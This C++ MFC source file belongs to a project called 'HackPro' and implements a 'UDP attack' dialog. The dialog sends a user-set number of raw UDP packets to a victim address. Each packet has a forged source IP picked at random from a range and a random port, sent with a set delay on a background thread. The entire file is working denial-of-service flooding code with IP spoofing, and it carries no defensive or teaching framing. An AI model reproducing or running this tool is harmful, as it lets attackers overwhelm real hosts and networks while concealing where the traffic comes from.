// UdpAttackDlg.cpp : implementation file
//

#include "stdafx.h"
#include "HackPro.h"
#include "UdpAttackDlg.h"


// CUdpAttackDlg dialog

IMPLEMENT_DYNAMIC(CUdpAttackDlg, CDialog)
CUdpAttackDlg::CUdpAttackDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CUdpAttackDlg::IDD, pParent)
{
}

CUdpAttackDlg::~CUdpAttackDlg()
{
}

void CUdpAttackDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_IPADDRESS1, M_Vip);
	DDX_Control(pDX, IDC_IP1, m_IP1);
	DDX_Control(pDX, IDC_IP2, m_IP2);
	DDX_Control(pDX, IDC_PROGRESS, m_Progress);
}
UINT CUdpAttackDlg::SndThrd(LPVOID PARAM)
{
	CUdpAttackDlg* This=(CUdpAttackDlg*)PARAM;
	This->m_Progress.SetRange(0,100);
	This->m_Progress.ShowWindow(SW_SHOW);

	//get the IPs
	DWORD VIP,IP1,IP2,DIFF;
	This->M_Vip.GetAddress(VIP);
	This->m_IP1.GetAddress(IP1);
	This->m_IP2.GetAddress(IP2);
	DIFF=IP2-IP1;
	
	
	unsigned short port=0;

	//get the delay and NoOfPackets
	int delay=This->GetDlgItemInt(IDC_DELAY);
	int NoOfPackets=This->GetDlgItemInt(IDC_NUMOFPACKETS);

	//Initilaize the socket
	CNetSocket sock;
	sock.InitSocket(0);
	sock.SetOpt();
	srand(IP2-IP1);

	//Set some parameters before the loop
	PacketParam p;
	p.destination=VIP;
	p.ttl=128;


	//Prepare an udp packet
	char* data="abcdefghijklmnopqrstuvwxyz";
	
	UDP_HEADER udphead;
    udphead.Length=20;
	udphead.Checksum=0;
	
		
	for(int i=0;i<NoOfPackets;i++)
	{
		//set the progress
		This->m_Progress.SetPos((i*100)/NoOfPackets);
		
		//Get the random ip from given range
		int Rnd=rand();
		DWORD ip=Rnd%DIFF+IP1;
		int seq=rand();
		seq=seq%500; //let the sequence number between 0 to 499

		port=rand();
		
		//set parameters;
		p.source=ip;
		p.port=port;
		
		udphead.DestinationPort=port;
		udphead.SourcePort=port;
		//send the packet
		
		int b=sock.SendUDPPacket(p,udphead,data,26);

		if(b<=0)
		{
			break;
		}
					
        Sleep(delay);
	}
	This->m_Progress.ShowWindow(SW_HIDE);
	return 1;
}



BEGIN_MESSAGE_MAP(CUdpAttackDlg, CDialog)
	ON_BN_CLICKED(IDC_BTSTART, OnBnClickedBtstart)
END_MESSAGE_MAP()


// CUdpAttackDlg message handlers

void CUdpAttackDlg::OnBnClickedBtstart()
{
	AfxBeginThread(CUdpAttackDlg::SndThrd,(LPVOID)this);
}
